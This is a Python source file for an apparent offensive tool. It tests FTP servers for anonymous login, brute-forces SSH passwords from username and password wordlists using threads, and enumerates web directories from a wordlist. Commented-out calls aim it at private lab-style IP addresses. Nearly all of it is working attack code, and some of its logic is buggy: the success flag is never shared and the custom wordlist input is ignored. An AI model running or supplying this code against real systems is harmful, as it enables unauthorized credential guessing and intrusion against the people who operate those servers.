from ftplib import FTP
import paramiko
import threading
import socket
import os
import sys
import requests
from prettytable import PrettyTable
#<!----------------------------------------------------------------------------------FTP--------------------------------------------------------------------------->
def Ftp(Ip):
    ftp=FTP(Ip)
    if (ftp.login('anonymous','password')):
        print('Anonymous Login Allowed !')
        print(ftp.getwelcome())
        if not (ftp.dir()):
            print('You May Try Listing Files using PFTP later')
        else:
            print(ftp.dir())
    else:
        print('Anonymous Login Not-Allowed') 
        ftp.quit()
        ftp.close()   
        
#<!----------------------------------------------------------------------------------SSH--------------------------------------------------------------------------->
def ssh_connect(Ip,user,password, code=0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy)

    try:
        ssh.connect(Ip, port=22, username=user, password=password)
    except paramiko.AuthenticationException:
        code = 1
    except socket.error:
        code = 2

    ssh.close()
    return code
def SshBrute(Ip):
    Ufilepath='usernames.txt'
    Pfilepath='passwords.txt'
    resp=input('Do You Want To Proced With Default Wordlist Y or N : ')
    if(resp=='N' or resp=='n'):
        Ufilepath=input('Enter File Path For User Names (Remember to add \'End\' as last Word in wordlist : ')
        Pfilepath=input('Enter File Path For Passwords  : ')   
        if os.path.exists(Ufilepath) == False or os.path.exists(Pfilepath) == False:
            print('[!!] That File/Path Does Not Exist')
            sys.exit(1)
    else:
        print('Continuing With Default Lists . .') 
    users=open(Ufilepath,'r')
    passw=open(Pfilepath,'r')
    user=users.read()
    pasw=passw.read()
    user=user.strip()
    user=user.split()
    pasw=pasw.strip()
    pasw=pasw.split()
    flag=0
    #no. of threads will depend upon the length of username wordlist
    try:
     for x in range(len(user)):
        if user[x]!='End' or flag==0:
            uname=user[x]
            print('Thread For '+uname+' Has Started ')
            tx = threading.Thread(target=Sshrun, args=(Ip,uname,pasw,))
            tx.start()
            tx.join()
    except KeyboardInterrupt:
            pass
def Sshrun(Ip,user,pasw):     
    try:
            for line in pasw:
                    password = line
                    response = ssh_connect(Ip,user,password)
                    if response == 0:
                        flag=1
                        print("[+] Correct password for "+user+"    : "+password)
                        
                        
                    elif response == 1:
                        pass
                        #print('[-] Incorrect password for ',user,':',password)
                    elif response == 2:
                        print('[!!] Can Not Connect')
                        sys.exit(1)
    except KeyboardInterrupt:
            print('Program Exited Exit')

#<!----------------------------------------------------------------------------------HTTP-------------------------------------------------------------------------->                     

def DirsBrute(Ip):
    url='http://'+Ip+'/'
    r=requests.get(url)
    table=PrettyTable(['Attributes','Value'])
    hd=r.headers
    for x in hd:
        table.add_row([x,hd[x]])
    
    print('\n',table)
    X=input('Do You Want To Proceed With Directory Bruteforce Y/N :')
    Wordlist='common.txt'
    if X=='Y' or X=='y':
        FilePath=input('Do You Want To Specify Wordlist Path Y/N :')
        if FilePath=='Y' or FilePath=='y':
            wordlists=input('Enter Path (Remember to add \'End\' as last Word in wordlist): ')
        else:
            print('Continuing With Default Wordlist . .')
        file=open(Wordlist,'r')
        Dname=file.readline()
        Dir=Dname.strip()
        print('Web-Pages Found ... ')
        try:
         while(Dir!='End'):
            url='http://'+Ip+'/'+Dir
            r=requests.get(url)
            if r.status_code ==200:
                print(url)
            Dname=file.readline()
            Dir=Dname.strip()
        except KeyboardInterrupt:
            print('Program Exited')




#DirsBrute('172.17.42.105')
#print(SshBrute('10.10.51.108'))                
#Ftp('10.10.230.169')
#adon later
